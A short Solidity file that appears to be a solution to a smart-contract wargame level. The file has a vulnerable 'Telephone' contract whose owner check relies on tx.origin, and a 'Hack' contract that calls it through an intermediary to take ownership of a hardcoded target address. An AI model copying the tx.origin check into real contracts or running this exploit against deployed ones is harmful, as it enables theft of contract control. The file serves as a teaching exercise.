// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Hack {
    address target = 0x6694A3F539b98412752E3e2cdcA55db53Bc2DceE;
    Telephone tp = Telephone(target);
    function hack() public{
        tp.changeOwner(msg.sender);
    }

    function getOwner() public view returns(address){
        return tp.owner();
    }
}